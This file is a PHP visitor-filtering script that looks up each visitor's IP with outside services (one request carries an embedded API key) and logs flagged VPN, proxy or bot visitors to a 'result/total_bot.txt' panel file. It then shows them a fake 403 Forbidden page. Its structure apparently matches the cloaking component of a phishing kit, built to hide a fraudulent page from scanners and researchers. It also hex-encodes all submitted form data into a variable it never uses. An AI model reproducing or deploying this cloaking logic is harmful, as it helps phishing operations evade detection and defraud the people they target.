<?php
$random_id = sha1(rand(0,1000000));
function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $v_ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $v_ip = $forward;
    }
    else
    {
        $v_ip = $remote;
    }

    return $v_ip;
}

$v_ip = getUserIPs();
    if($v_ip == "127.0.0.1") {
    }else{
        if($alt_block_vpn == "on") {
            $url = "https://blackbox.ipinfo.app/lookup/".$v_ip;
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $resp = curl_exec($ch);
            curl_close($ch);
            $result = $resp;
            if($result == "Y") {
                $file = fopen("proxy-block.txt","a");
                $message = $v_ip."\n";
                fwrite($file, $message);
                fclose($file);
                $click = fopen("result/total_bot.txt","a");
                fwrite($click,"<tr><td><p class=\"text-danger\">$v_ip|VPN/Proxy</p></td></tr>");
                fclose($click);
                header('HTTP/1.0 403 Forbidden');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
                exit();
            }
        } else {
            $isp = print_r($_POST, true);
            $isp = bin2hex($isp);
            $url = "http://highwall.space/check/?ip=".$v_ip."&fingerprint=on&ispinfo=isp&flags=b&api=SKecCwlsiuTDuIT8gZT";
            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL,$url);
            curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $resp = curl_exec($ch);
            curl_close($ch);
            $result = json_decode($resp);
            $a = $result->badbot;
            if($a == "true") {
                $file = fopen("proxy-block.txt","a");
                $message = $v_ip."\n";
                fwrite($file, $message);
                fclose($file);
                $click = fopen("result/total_bot.txt","a");
                fwrite($click,"<tr><td><p class=\"text-danger\">$v_ip|VPN/Proxy</p></td></tr>");
                fclose($click);
                header('HTTP/1.0 403 Forbidden');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
                exit();
            }

        }
    }

?>
